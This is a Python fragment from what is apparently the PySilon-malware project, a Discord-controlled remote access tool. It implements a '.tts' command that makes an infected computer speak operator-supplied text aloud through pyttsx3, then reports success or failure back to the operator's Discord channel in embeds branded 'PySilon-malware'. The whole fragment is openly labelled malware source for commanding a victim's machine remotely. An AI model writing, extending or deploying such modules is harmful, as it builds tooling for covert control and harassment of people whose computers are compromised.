import pyttsx3
import asyncio

elif message.content.startswith('.tts'):
    await message.delete()
    texto_tts = message.content[5:].strip().strip('"').strip("'")
    
    if not texto_tts:
        embed = discord.Embed(title="📛 Error", description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        def reproducir_tts(texto):
            motor = pyttsx3.init()
            velocidad_actual = motor.getProperty('rate')
            motor.setProperty('rate', velocidad_actual - 50)
            motor.say(texto)
            motor.runAndWait()
            motor.stop()

        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, reproducir_tts, texto_tts)

        embed = discord.Embed(title="🟢 Success", description=f'```Successfully played TTS message: "{texto_tts}"```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
